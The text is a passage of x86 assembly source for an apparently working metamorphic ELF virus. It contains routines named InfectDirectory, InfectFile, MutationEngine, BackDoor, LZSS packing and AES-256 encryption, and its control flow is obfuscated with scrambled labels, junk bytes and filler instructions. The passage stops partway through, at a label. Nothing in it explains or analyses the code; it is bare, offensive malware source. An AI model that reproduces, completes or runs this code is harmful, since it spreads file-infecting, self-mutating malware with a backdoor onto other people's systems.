    mjmp        ..@z0GLfQAYZ3xT
db 0xfc
..@z0GLfQAYZ3xT:
    mjmp        ..@oHmNeLM4DeYW
..@U1kmtU6tQjB4:
    mov         QWORD [r5+file.filesize], r3
    mjmp        ..@nCmEtxGD7zDp
    mjmp        ..@KCj1hdUNAVwE
..@UmpDUNt323wL:
    pop         rsi
    mjmp        ..@D0WgeS885EhD
db 0x94, 0xf4, 0x21
..@D0WgeS885EhD:
    mjmp        ..@KUV3dK863KfK
..@7HgDQx6RaPy1:
    or          bl, cl
    shl         rbx, 8
    mjmp        ..@hmyNjEvpSqc4
db 0xde, 0x26, 0x67
..@hmyNjEvpSqc4:
    mjmp        ..@x0SjTmSPKZF1
db 0xe3
..@x0SjTmSPKZF1:
    mjmp        ..@RpcfiP7Y196X
db 0x04, 0x03, 0xcd
..@RpcfiP7Y196X:
    mjmp        ..@2AtznWZKDxyT
..@sXE3lJkHeqI5:
%ifdef X86_64
    mov         dil, 41h
%endif
    mjmp        ..@4NMsZsHgDDsg
db 0x47, 0xec
..@4NMsZsHgDDsg:
    mjmp        ..@wOnPjQhqBO2N
db 0xe1, 0xd7, 0x30
..@wOnPjQhqBO2N:
    mjmp        ..@C8MEX8apOpaK
..@JLNTWtABwL3C:
    movr        rbp, rbp
    mjmp        ..@vMEdpcG52Qss
..@7gZFmWPyHzY4:
    jl          ..@QTfJUVkc6aFt
    movv        rax, 1
    mjmp        ..@qwT1MLMOd5Uf
db 0xa9, 0x04
..@qwT1MLMOd5Uf:
    mjmp        ..@vWeN6fyt8DhZ
db 0x3d, 0x9f
..@vWeN6fyt8DhZ:
    mjmp        ..@sEesYzEwdJOI
db 0xe7
..@sEesYzEwdJOI:
    mjmp        ..@TvKPbXM2e4gP
..@0y0ccqi1eN7Z:
    movv        rax, (-1)
    movr        rbx, rbx
    ret
    mjmp        ConvertAddToSub
..@uO1a1Kk1xksY:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_FORK
    syscall
    test        eax, eax
    jnz         ..@FngaR8P2M2DO
    push        rbx
%endif
    mjmp        ..@9roj38nNAxoj
db 0x6e, 0xf2
..@9roj38nNAxoj:
    mjmp        ..@2UVyKrGYxPVl
db 0x42, 0x4c
..@2UVyKrGYxPVl:
    mjmp        ..@YNjC8mz0AyY9
..@gPnwsth0Z1KY:
    push        rax
    pop         rax
    pop         rsi
    movv        rax, (-1)
    mjmp        ..@xibepByllQdf
..@RDQY2wzNQzP4:
    jle         ..@wIVR8kZ4xY8R
    mjmp        ..@nCZMc1SIsS9u
..@OJCjzFDJLifo:
    xchg        rcx, rcx
    mjmp        ..@GLzQlVMUlnFP
..@YNjC8mz0AyY9:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    mjmp        ..@JHAG12n3HXEB
..@DtifoZ5CcITp:
    sub         rsi, 1
    mjmp        ..@J4l7PatHM5ZF
db 0xac, 0xa9
..@J4l7PatHM5ZF:
    mjmp        ..@L8Fcnglx3B5D
db 0xd1, 0x45
..@L8Fcnglx3B5D:
    mjmp        ..@yiW9eO2OxL8O
..@mLCj5GQV4QWe:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mjmp        ..@DZkJg6GrGy1y
..@KVndoL6j1Kq6:
    xor         rax, rax
    mjmp        ..@l7XLpgMaGUz9
..@OWiMK6SQyBB8:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    xchg        rsp, rsp
    mjmp        ..@auAcyXpUvnIP
db 0x34
..@auAcyXpUvnIP:
    mjmp        ..@3710VD3hbguo
..@9B5Aip2PRXfI:
    movr        rdx, rdx
    mjmp        ..@hgVGPbpJFib0
..@S10scIwnJ1Eo:
    call        InfectDirectory
    mjmp        ..@ClaaHkCKiW9F
..@12yx4INyixoT:
    ret
    mjmp        ..@OwIL8YtzjyZ7
db 0xd1
..@OwIL8YtzjyZ7:
    mjmp        ..@kpVJ3g85jmHA
db 0x22, 0xa5
..@kpVJ3g85jmHA:
    mjmp        ..@Xva4oXnn6s2f
db 0x6f, 0xac, 0xe8
..@Xva4oXnn6s2f:
    mjmp        InfectFile
LzssEncoder:
    mjmp        ..@7gl6lhlKckm1
..@dSyf36pEzqHG:
    xchg        rdi, rdi
    cmp         dl, 101000b
    je          ..@IHos0Gy9cNPa
    movr        rsi, rsi
    mjmp        ..@SMhOZNvIAdk3
..@N2QGhKdnRdHe:
%ifndef ENABLE_DEBUGGING
    push        rdx
    pop         rdx
%endif
    mjmp        ..@JqtLcg8MubP6
db 0xac, 0xe6
..@JqtLcg8MubP6:
    mjmp        ..@EAvHxXJNqb4G
..@ptzHh92VwB1I:
    movr        rsp, rsp
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    mov         rdi, m6
    mjmp        ..@2YDvWisJbsaJ
..@OElwMlucAwCa:
%ifndef ENABLE_DEBUGGING
    pop         rdi
    xchg        rsp, rsp
%endif
    mjmp        ..@9AdCra8Ei8LD
..@D6NbMNOj03aJ:
    pop         rcx
    pop         rsi
    movv        rax, (-1)
    push        rsi
    mjmp        ..@hKMjR9GKcFP6
db 0x11, 0xec
..@hKMjR9GKcFP6:
    mjmp        ..@MgJnC56SVx50
db 0x3a
..@MgJnC56SVx50:
    mjmp        ..@xbHTOolcs6DD
..@I73DJ1Eofj7H:
    add         ecx, 1
    mov         BYTE [rdi], 0e9h
    mov         DWORD [rdi+1], ecx
    mov         DWORD [rdi+5], 90909090h
    movr        rsp, rsp
    mjmp        ..@Gh4VIiYWhm7f
..@Zeyzmsqg5KZC:
    movv        rdx, 100000000b
    or          bx, dx
    mjmp        ..@rLsuD9UHpr4R
db 0xef, 0xf7, 0x64
..@rLsuD9UHpr4R:
    mjmp        ..@pCCf5TJPeDAt
..@hlKmn7SJF9SO:
    pop         r4
    mjmp        ..@5aDMnVLZpdX0
db 0xca
..@5aDMnVLZpdX0:
    mjmp        ..@K6zvSS7dm8bR
db 0x41, 0xa6
..@K6zvSS7dm8bR:
    mjmp        ..@W1LXw7m9DLGD
..@h0PXrDoi6W6N:
%ifdef X86_64
    jne         ..@04J5YQQhw4ej
%endif
    mjmp        ..@9Tq8awfDxCEk
db 0xff, 0x44
..@9Tq8awfDxCEk:
    mjmp        ..@8WgxpwYalSZV
..@UWasMjuhxcW4:
    add         r2, r1
    xor         r4, r4
    mjmp        ..@AOF77768Pu8U
db 0x91
..@AOF77768Pu8U:
    mjmp        ..@zrjxNHqWieo8
db 0xe8
..@zrjxNHqWieo8:
    mjmp        ..@5WJCbOGhlAqE
db 0x46, 0x0a
..@5WJCbOGhlAqE:
    mjmp        ..@DYiCKX6PWMqR
..@23jnsyqkigKx:
    push        rdi
    mjmp        ..@oTxxNuHkFqex
..@9kos1xEDUIKk:
%ifdef X86_32
    mov         BYTE [esi+ecx], 90h
%endif
    mjmp        ..@isX9PNXCHmYP
db 0x29
..@isX9PNXCHmYP:
    mjmp        ..@3y9xkc4IqKnC
..@lejSaWHq8t0u:
%ifdef X86_64
    jz          ..@lnIV3TY0jtKD
%endif
    mjmp        ..@Cpvy5Pp9kGA3
..@v9KZYOWe0zPN:
    push        rax
    xchg        rdi, rdi
    mjmp        ..@UwOQk4sfIhoO
db 0xaa, 0x13, 0x4c
..@UwOQk4sfIhoO:
    mjmp        ..@apReHxgPr0MB
..@DZkJg6GrGy1y:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    mjmp        ..@1DYH7e887hWl
db 0xdc, 0x09, 0xc8
..@1DYH7e887hWl:
    mjmp        ..@dGExjX8VtIFw
..@vqFVaczEFcyp:
    xor         rax, rax
    mjmp        ..@SX0vFrZ1fi3R
..@1jLhdnICkCC7:
    call        ConvertMoveValueToPushPopValue
    mjmp        ..@vt8KB469lLgB
db 0x17, 0x0e
..@vt8KB469lLgB:
    mjmp        ..@WtorU1I7Hyzk
..@LDnAuZ2tbAKM:
    pop         rdi
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jne         ..@T2vnnN0Htpb2
    mjmp        ..@GNo3eWhmdJtS
..@vMEdpcG52Qss:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    mjmp        ..@DUi69bTNcMJn
db 0xd5, 0x94
..@DUi69bTNcMJn:
    mjmp        ..@vScslf2gzHHo
..@gYRSgbi3HT66:
    xor         r4, r4
    movv        rax, SYS_WAIT4
    syscall
    mjmp        ..@wxwWfm7MP6qM
    mjmp        ..@KCzPFXmmnbhm
..@eaxpxVBj8mys:
    movr        rbx, rbx
    mjmp        ..@yrXNrUsePR5Q
..@xW7GMZs8hYcB:
    movr        rbp, rbp
    mjmp        ..@ebCZjAxfY75g
..@jNfNJk6381aG:
    xor         rax, rax
    mjmp        ..@dIsOAgjUr9dX
..@8elQHt3HRGCv:
    jge         ..@meDYXHTqiqbB
    mjmp        ..@w5CWvnnuNZq7
..@3VX3i4ksqyvA:
    mov         rsi, m7
    xchg        rsi, rsi
    sub         rsi, m6
    mov         DWORD [rdi], esi
    mjmp        ..@AFIrPTt5Bnhe
..@VBCDbSM5rVXm:
    xchg        rsi, rsi
    sub         rcx, rax
    movr        rax, rax
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    mjmp        ..@H8uTnwxofw5j
..@FngaR8P2M2DO:
%ifndef ENABLE_DEBUGGING
    movr        r1, rax
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
%endif
    mjmp        ..@bB4c2GuXufjp
db 0x08, 0x2e
..@bB4c2GuXufjp:
    mjmp        ..@gMRcDlUSY80z
..@xhwp73hnTnYd:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
%endif
    mjmp        ..@iACn7Ku3PONU
..@H5Mljz6WHojT:
    cmp         dl, 68h
    mjmp        ..@NJUa1cXLAvvm
db 0xda, 0xdd, 0xfb
..@NJUa1cXLAvvm:
    mjmp        ..@YcSMsr59uSud
..@l5ALu5nBcvTC:
    movr        r5, r1
    mjmp        ..@tzHLMwr6K0ey
db 0x26
..@tzHLMwr6K0ey:
    mjmp        ..@7i22LjxPwyzS
..@80xEYZEUX6W4:
    test        cl, cl
    jz          ..@btcETYG3iChO
    mov         rsi, QWORD [rsp+bytes]
    xchg        rsi, rsi
    mjmp        ..@22WXeQC0YBtl
db 0xd5, 0xf7, 0x14
..@22WXeQC0YBtl:
    mjmp        ..@cAwdiBpo9m2f
MutationEngine:
    mjmp        ..@EH1A0eexuZ91
BackDoor:
    mjmp        ..@uO1a1Kk1xksY
..@Gz2Q9TpFbeAg:
    pop         rcx
    pop         rsi
    mjmp        ..@qJBpAS3OR4oZ
..@IceCoJr1oGUr:
%ifdef X86_64
    and         rax, 1b
%endif
    mjmp        ..@3NS3Lj8JMDtw
..@lITlgPb0y8pY:
    sub         rsp, 0x100
    push        0x00
    movv        rax, SYS_GETUID
    mjmp        ..@OJCjzFDJLifo
..@iACn7Ku3PONU:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    movv        eax, SYS_MMAP2
%endif
    mjmp        ..@kKi244D0bm0P
db 0x09
..@kKi244D0bm0P:
    mjmp        ..@IlMLha1eFwRN
..@SEZXw6Dul0yi:
    xchg        rcx, rcx
    mjmp        ..@qfvkZ2FChvy4
db 0xd0
..@qfvkZ2FChvy4:
    mjmp        ..@uFHLxQN1lyrQ
db 0xa3
..@uFHLxQN1lyrQ:
    mjmp        ..@NJ80ACEUyayG
..@H0S4DcimrtXf:
    call        MutationEngine
    xor         r2, r2
    xor         r3, r3
    mov         r1, m6
    add         r1, _signature-_start
    mjmp        ..@D8UjH6iEcduA
db 0xa0, 0xf7, 0xf8
..@D8UjH6iEcduA:
    mjmp        ..@qg3uToyfgqTq
..@5Ql1DAZeCVRx:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    mjmp        ..@qPEhFpjaijaC
..@qyPmQzgphleh:
    sub         rsp, _INFDIR_OFF_size
    mjmp        ..@v7WLd4g5AtxH
db 0x29, 0x02, 0xb1
..@v7WLd4g5AtxH:
    mjmp        ..@6vAqC4XWlsaI
..@K8SPCits30Ei:
    rep         nop
    movv        r3, _signature.startsize
    call_vsp    Strncmp
    mjmp        ..@zprRkjVlVfrM
db 0xd6, 0x17, 0x0c
..@zprRkjVlVfrM:
    mjmp        ..@D0UGOR9F3S5U
..@Zzw0PMjgKbDR:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    mjmp        ..@eIhuUBvedg8F
..@OYld2XVhTRnt:
%ifdef X86_64
    shr         rdi, 32
%endif
    mjmp        ..@ktlg1DQJYb4J
..@gW2b4rHsgezb:
    cmp         rax, 0xffffffffffffffff
    je          ..@KCj1hdUNAVwE
    mov         QWORD [r5+file.fileptr], rax
    mjmp        ..@U1kmtU6tQjB4
..@r2ffnTAYqjjI:
    push        rsi
    push        rcx
    xor         rax, rax
    rep         nop
    mjmp        ..@kUbg7XI03ioL
db 0xec, 0xb7, 0xa6
..@kUbg7XI03ioL:
    mjmp        ..@VHfS8PhG4lYJ
..@VJ8IPyf1bweI:
    movr        rdx, rsi
    mjmp        ..@pykal0b1QUUc
db 0xd9
..@pykal0b1QUUc:
    mjmp        ..@YYE52nUaB9e0
..@jpkSvOEzqrI2:
    jz          ..@zx0pmIqNko2m
    mjmp        ..@dSyf36pEzqHG
..@wFuC7bFTuiwy:
    syscall
    ret
    mjmp        ..@iQZc3fNSca42
db 0x96, 0x37, 0xaa
..@iQZc3fNSca42:
    mjmp        ..@Es0v4rzzsw2U
db 0x9b
..@Es0v4rzzsw2U:
    mjmp        MutationEngine
..@B6Tra0D0dSw0:
    push        r3
    xchg        rbx, rbx
    mjmp        ..@kfhCZA7UrPab
..@h516qKadUDDd:
    xor         rbx, rbx
    mjmp        ..@abWYp7ObilOK
db 0x67, 0xf8, 0x28
..@abWYp7ObilOK:
    mjmp        ..@e1tMXYqGV7wQ
db 0xf8, 0xe2
..@e1tMXYqGV7wQ:
    mjmp        ..@v3gsBjzy0OYy
..@Vf3XrFlCA8iV:
    xchg        rdi, rdi
    call        WORDToDWORDASCII
    mjmp        ..@yjRGTseVLn73
db 0x3c, 0x92
..@yjRGTseVLn73:
    mjmp        ..@NN1LfZegG2lV
db 0x4d
..@NN1LfZegG2lV:
    mjmp        ..@971YgNTXQiTI
..@F2GEOgp2VOi7:
%ifdef X86_64
    movv        rax, SYS_MMAP
%endif
    mjmp        ..@BkqYCjzgt32H
db 0x12
..@BkqYCjzgt32H:
    mjmp        ..@uvJgycYvRpet
db 0x2c
..@uvJgycYvRpet:
    mjmp        ..@E73LtXfRwDsM
..@QikMnbu0o9mm:
    xchg        rcx, rcx
    mjmp        ..@zV6XmVXntWHF
..@LfypMG2HSSJO:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    movr        rsi, rsi
    test        al, al
    mjmp        ..@0r4VNAL2SaBL
db 0x16, 0x61
..@0r4VNAL2SaBL:
    mjmp        ..@yt0s9e630oXW
..@1h6UGxg6jMST:
    cmp         dl, 0ebh
    je          ..@AfInaYcIbiRa
    cmp         dl, 0e9h
    mjmp        ..@5SdYygnzLrUb
..@2FkcCxqfEwxe:
    pop         rcx
    mjmp        ..@ffmO6u6vWINN
db 0x36
..@ffmO6u6vWINN:
    mjmp        ..@ubdTXHj5ox8q
..@KCzPFXmmnbhm:
    movv        rax, SYS_FORK
    syscall
    test        eax, eax
    jnz         ..@ZmLWLBeoAcem
    xchg        rsi, rsi
    mjmp        ..@B37SUBZoOYCb
..@VS1Sy4nfkuW1:
    add         rsp, 0x100
    mjmp        ..@Pk7r0KITkHvi
..@SdFwOKkhTuVx:
    xchg        rdi, rdi
    mov         QWORD [r2+p_h.p_offset], r3
    mjmp        ..@vhJ7lWBiZb2z
..@6s3ZGc2InTFV:
    movv        rbx, 32
    div         rbx
    mjmp        ..@1BLwYBwK12xm
..@0Wagg6Oc5BJt:
%ifdef X86_64
    shr         rdx, 8
%endif
    mjmp        ..@3dJXRfDswfdc
..@gS8QUmLe0v0j:
    pop         rdx
    mjmp        ..@WDOmjymxRt1S
db 0x9c, 0xad
..@WDOmjymxRt1S:
    mjmp        ..@uKGIrVuDR4H4
..@HHHly9HEYrzX:
%ifdef X86_64
    jz          ..@VJ597LCJTYV0
    shl         edi, 8
%endif
    mjmp        ..@sXE3lJkHeqI5
..@FTS1WVbNQtcX:
    push        rcx
    movr        rdi, rsi
    add         rdi, rcx
    xchg        rdi, rdi
    mov         edx, DWORD [rdi]
    mjmp        ..@SJ10PCUm7rAJ
..@qgZVJsVvWhuW:
    movr        rdi, rbx
    mjmp        ..@IObnz1YjDG7h
..@9zwnrqrjOEJS:
    movv        rax, (-1)
    mjmp        ..@yRzztQO58fIG
db 0x45, 0xf1, 0xb3
..@yRzztQO58fIG:
    mjmp        ..@63u2GIpGiWcz
db 0x26
..@63u2GIpGiWcz:
    mjmp        ..@M1QjwHku3IuK
..@r3GyuW97vigP:
    movr        rbx, rbx
    xchg        rsp, rsp
    xchg        rdx, rdx
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    mjmp        ..@YgASyKYL2jO5
db 0xf9, 0xa8
..@YgASyKYL2jO5:
    mjmp        ..@Vf3XrFlCA8iV
..@9zPUMmU3kSGB:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    mjmp        ..@KcGgc3nypkTg
db 0xc2, 0xd6
..@KcGgc3nypkTg:
    mjmp        ..@VRBSvmd8Bg3W
..@DADLTSYUt1qT:
    rep         nop
    movr        rdi, rdi
    movr        r2, r1
    movr        rbp, rbp
    mjmp        ..@Adqcpx9t4AiQ
..@WhqBjDc5Tec3:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    mjmp        ..@22WitxyLQBXG
..@MBtlF9p3dceU:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    mjmp        ..@Zeyzmsqg5KZC
..@4Sd0fTM1XqFA:
    push        rax
    pop         rax
    mjmp        ..@6iEkbpAcemMK
db 0xd9, 0xed
..@6iEkbpAcemMK:
    mjmp        ..@yEy6W1bPs8q8
..@hJQ9YOYGY6lt:
    VAR         packed, dirs_root
    mjmp        ..@pkQKiSeXIgHH
db 0xc9, 0x45
..@pkQKiSeXIgHH:
    mjmp        ..@FEfYbTMGnkPL
..@XsTcsVXeI1pJ:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    add         r1, rax
    sub         r1, 1
    cmp         BYTE [r1], DT_DIR
    mjmp        ..@h4tp0vn3elSm
db 0x41
..@h4tp0vn3elSm:
    mjmp        ..@jbGp8xk7Nob7
..@uOdPwxBFRHFR:
    xchg        rsp, rsp
    mjmp        ..@S3UPC6ymGL9R
db 0x60
..@S3UPC6ymGL9R:
    mjmp        ..@onCNOoVQWYKS
db 0xad
..@onCNOoVQWYKS:
    mjmp        ..@VS1Sy4nfkuW1
..@sfkJ4XCoPxTQ:
    pop         rdi
    mjmp        ..@AtigUk0fwax7
..@Q1SLk5BZVAbE:
    VAR         packed, urandom
    mjmp        ..@xD9Fqv7dVRzJ
db 0xab, 0xc0
..@xD9Fqv7dVRzJ:
    mjmp        ..@NqQif1e93r2o
..@hamxcTScvlfU:
%ifdef X86_64
    push        rcx
    pop         rcx
    push        rsi
    pop         rsi
%endif
    mjmp        ..@Lc1Y77TY7X0s
db 0x60, 0x16, 0x98
..@Lc1Y77TY7X0s:
    mjmp        ..@hU9LZSytFqSf
db 0xf5, 0x00, 0x61
..@hU9LZSytFqSf:
    mjmp        ..@toY0vzW0VWtK
db 0xe6
..@toY0vzW0VWtK:
    mjmp        ..@CiZA1S4WzsB7
..@GmbpNLDeNB9t:
    jl          ..@xUpKfzDnlvmx
    mjmp        ..@KbgRZJaYkkJm
db 0x32, 0xcb, 0x19
..@KbgRZJaYkkJm:
    mjmp        ..@9ok1CwED27Nj
..@j6fOx7soCuVG:
    sub         rsp, _PAYLOAD_OFF_size
    mjmp        ..@XttLYIyx01Cj
..@2eZX1tXUepi2:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    mjmp        ..@CbUSYu60UcxA
db 0xc7, 0x21, 0x94
..@CbUSYu60UcxA:
    mjmp        ..@AUNj0H2tfu7S
..@WYpKAYKzebOZ:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    movr        rdx, rdx
    mjmp        ..@Tz0JUYDvynPY
..@DiakdkySUNK2:
    cmp         rax, (-1)
    je          ..@CgQf3MvDnfWI
    xor         r3, r3
    mov         m6, rax
    movr        r1, rax
    mjmp        ..@TlIGPMnNZYuK
..@SX0vFrZ1fi3R:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    movv        rax, SYS_MUNMAP
    mjmp        ..@HAHwd80ZzG2Z
..@xdTAIzeOlYSz:
    movv        rax, 0x1
    mjmp        ..@iEPFFMipvehP
db 0xf3
..@iEPFFMipvehP:
    mjmp        ..@CVaz7rN2UqAk
..@IsUUnyeHDgEO:
    add         r4, 1
    mjmp        ..@YEUhndZ9VyM5
db 0xea
..@YEUhndZ9VyM5:
    mjmp        ..@AY3KYtWLDSZK
..@Bl2rpcMBO0ip:
    je          ..@XdXIeWcpFde5
    mjmp        ..@O8jRBVkZnHBg
db 0x67, 0xae
..@O8jRBVkZnHBg:
    mjmp        ..@Qo5JDoS5vE03
..@gawg7IRQZUpk:
    xor         rax, rax
    mov         dl, BYTE [rsi]
    cmp         dl, 05h
    je          ..@GF7N3Na93DnE
    cmp         dl, 2dh
    mjmp        ..@34beGWNyC9UD
..@9qfjcNJjEfCX:
%ifdef X86_32
    mov         dx, WORD [edi]
    push        rcx
    pop         rcx
    and         dx, 0f8f8h
%endif
    mjmp        ..@yieYAjmdn7zT
db 0x0a, 0xcd
..@yieYAjmdn7zT:
    mjmp        ..@atvk5F90xFvB
..@ECD07KppwEhg:
    and         edx, 111b
    or          dl, 58h
    xchg        rsp, rsp
    mjmp        ..@vx5P8jdrSaHq
db 0xe1, 0xb3, 0xaa
..@vx5P8jdrSaHq:
    mjmp        ..@FXRT5ntb0yJ6
..@261YPP9x13wy:
%ifdef X86_64
    xor         rax, rax
%endif
    mjmp        ..@S0L5tUSdin78
db 0x1c
..@S0L5tUSdin78:
    mjmp        ..@jMkpiqwt8ukY
..@QzsuS1mO3iVo:
    xor         rcx, rcx
    mov         rdi, m7
    mjmp        ..@LDSOTEo2ebMD
..@3NS3Lj8JMDtw:
%ifdef X86_64
    test        al, al
%endif
    mjmp        ..@lejSaWHq8t0u
..@AY3KYtWLDSZK:
    mjmp        ..@DYiCKX6PWMqR
    mjmp        ..@lQhJ1g2JYUlK
..@gOt3IikBr2kO:
    pop         rcx
    pop         rsi
    mjmp        ..@77rx7B6nXzop
..@ycdZZSKol5p4:
    push        rsi
    mjmp        ..@8IVWxXMQN0fR
db 0xed, 0x47, 0xfe
..@8IVWxXMQN0fR:
    mjmp        ..@8VwknLmJIDFW
..@r5q11P9nJWYG:
%ifdef X86_64
    je          ..@p1TRtLd8XYZN
    mov         edx, DWORD [rdi]
    and         edx, 0fff8fff8h
    cmp         edx, 90584150h
%endif
    mjmp        ..@k2RlZsc7oVRV
db 0x1a
..@k2RlZsc7oVRV:
    mjmp        ..@3HXyEiOk0Vna
..@c8eN2O8oeLCi:
    pop         rcx
    xor         r2, r2
    mjmp        ..@GcwcPszRnE9d
..@gPZZ8E1IuaSv:
    and         al, 111b
    push        rdx
    xchg        rax, rax
    pop         rdx
    or          cl, al
    mjmp        ..@FgvGBS7UPZt7
db 0xf3
..@FgvGBS7UPZt7:
    mjmp        ..@XhxrssoWFL5N
..@atvk5F90xFvB:
%ifdef X86_32
    cmp         dx, 5850h
%endif
    mjmp        ..@7OsF0nEAbttC
..@R6F1ynCHy6Gh:
    aesenclast  xmm0, xmm1
    movdqu      [rsi+rcx], xmm0
    mjmp        ..@BQABUu4v762b
db 0x16
..@BQABUu4v762b:
    mjmp        ..@9XF3SP6lsqOS
db 0xac, 0xa7, 0xad
..@9XF3SP6lsqOS:
    mjmp        ..@G6RBhY1NtVp6
..@GF7N3Na93DnE:
    mov         BYTE [rsi], 2dh
    movv        rax, 1
    push        rdi
    mjmp        ..@mt8NaTrqizBj
..@nvny7fCoacmQ:
    pop         rdx
    pop         rcx
    pop         rsi
    mjmp        ..@YOKfLTMXbNlT
db 0xd1, 0xaf, 0xac
..@YOKfLTMXbNlT:
    mjmp        ..@0y0ccqi1eN7Z
..@E73LtXfRwDsM:
%ifdef X86_64
    syscall
%endif
    mjmp        ..@BwO9cGCeVJMO
db 0xb7, 0x69
..@BwO9cGCeVJMO:
    mjmp        ..@O4VEd81qAH4X
..@Hl6EDIkz4wNf:
    lea         r1, [rsp+_INFFILE_OFF.file]
    movr        r2, r4
    call        AddSizeMappedFile
    cmp         rax, (-1)
    je          ..@lQhJ1g2JYUlK
    mjmp        ..@J7JuhFVzzaBC
..@ZuLM8Nqolfkk:
    movr        rax, rax
    movr        r3, rax
    call_vsp    Strncmp
    mjmp        ..@xdLu1k7UREKY
db 0xe0, 0x17
..@xdLu1k7UREKY:
    mjmp        ..@EgnEWZkLabhW
db 0x2c
..@EgnEWZkLabhW:
    mjmp        ..@MFoHmULFvii7
..@qM38vlsaBz4c:
    push        r1
    xchg        rax, rax
    mjmp        ..@RnRevRb1dQnE
db 0xff, 0x35, 0xaa
..@RnRevRb1dQnE:
    mjmp        ..@zhSEv0f9DBv4
..@uLGN9p0iiax9:
    pop         rcx
    mjmp        ..@aHG1WgkR10o9
..@nCZMc1SIsS9u:
    mov         QWORD [r5+file.filesize], rax
    mjmp        ..@gP5nAvbb7z89
..@AyqcLlFYyjDN:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    mjmp        ..@BD7hNDOXBE9U
..@gbvw6cKFTU0w:
    xor         rdx, rdx
    mjmp        ..@rDUbl833Gvbe
db 0xf1, 0xb0, 0x35
..@rDUbl833Gvbe:
    mjmp        ..@O9OJGRmCCJnK
..@oThCUaFbstoG:
%ifdef X86_64
    shl         rbx, 8
%endif
    mjmp        ..@qtiQIeRJoJIb
..@xmC5gxdD2nfc:
%ifdef X86_64
    movr        rcx, rcx
    movv        rdx, 11b
    push        rbx
    pop         rbx
    movv        r10, 0x22
%endif
    mjmp        ..@ljCnmLBDcYdw
..@CiZA1S4WzsB7:
%ifdef X86_64
    or          dl, 1b
    shr         rax, 8
%endif
    mjmp        ..@VQJRIWFkCXYA
db 0x62, 0x49, 0x21
..@VQJRIWFkCXYA:
    mjmp        ..@gPZZ8E1IuaSv
..@22WitxyLQBXG:
    movr        rsp, rsp
    mov         BYTE [r1], '/'
    xchg        rbx, rbx
    add         r1, 1
    xchg        rsp, rsp
    mjmp        ..@3Vlts2IAxr8H
db 0xfd, 0x06, 0xa1
..@3Vlts2IAxr8H:
    mjmp        ..@yi9F4kRMTs4t
db 0xed, 0xc0, 0x98
..@yi9F4kRMTs4t:
    mjmp        ..@xV97SyFh9ZLd
db 0xdb, 0xf5, 0x3a
..@xV97SyFh9ZLd:
    mjmp        ..@hUnKOvbuaP3H
..@7is1dBaPq5xF:
    xchg        rsi, rsi
    mjmp        ..@HqKlFEO6fFY1
..@euJZHUJTW0wC:
    jle         ..@nnoKf6qA5x7D
    xchg        rdx, rdx
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    cmp         rax, 0x00
    mjmp        ..@UtSZlwPTVgwp
db 0x6b, 0x4d, 0xc8
..@UtSZlwPTVgwp:
    mjmp        ..@8nwKhoFxT6xf
db 0xb4
..@8nwKhoFxT6xf:
    mjmp        ..@85zHjUdF0AX3
..@CijgqCGeIfNC:
    aesenc      xmm0, xmm1
    mjmp        ..@quggYzJALp7d
db 0x3b, 0xee, 0xf1
..@quggYzJALp7d:
    mjmp        ..@4Kxe7XPxGFJv
..@q9xGIlpiiid8:
    rep         stosb
    mjmp        ..@jNWk50YQD0ng
..@MFoHmULFvii7:
    test        ax, ax
    jz          ..@MavS6kf0Pdgi
    push        rdx
    pop         rdx
    add         r4, r3
    mjmp        ..@esYlxBDW5YrD
..@3FzbAqzzseee:
%ifdef X86_64
    and         edx, 0000f8ffh
    cmp         edx, 0000b841h
    push        rsi
%endif
    mjmp        ..@7nAvWtE08rQG
..@mr7fn7YlVqVh:
    xor         rbx, rbx
    push        rsi
    pop         rsi
    xor         rdx, rdx
    movr        rax, rcx
    mjmp        ..@6s3ZGc2InTFV
..@IObnz1YjDG7h:
%ifdef X86_64
    mov         bl, sil
    and         bl, 00000101b
%endif
    mjmp        ..@EVUB7Qs2O1cL
db 0x49, 0x4e
..@EVUB7Qs2O1cL:
    mjmp        ..@WL70SOsH2RmM
..@9Q98quBVdk59:
    movr        rcx, rdx
    and         ecx, 0ffffff80h
    mjmp        ..@uhjL1vWvmNF7
db 0x9a, 0x95, 0x9b
..@uhjL1vWvmNF7:
    mjmp        ..@qc9W8sE4w7c1
..@jNWk50YQD0ng:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    mov         r2, m6
    add         r2, _virus-_start
    mjmp        ..@DbgrA230CyHU
..@rCan4chxKMQ9:
    pop         rsi
    push        rcx
    pop         rcx
    movr        rsp, rsp
    mjmp        ..@2XWD9hKOUTZZ
AddSizeMappedFile:
    mjmp        ..@bTzgExjMldyM
Aes256Encryption:
    mjmp        ..@5OTUSH3xtr49
..@btcETYG3iChO:
    pop         rcx
    pop         rsi
    xor         rax, rax
    ret
    mjmp        ..@uLGN9p0iiax9
..@456LCpgTPsge:
%ifdef X86_64
    pop         rsi
%endif
    mjmp        ..@zvEtWF7wnQmr
..@vaxX1rVlWAx4:
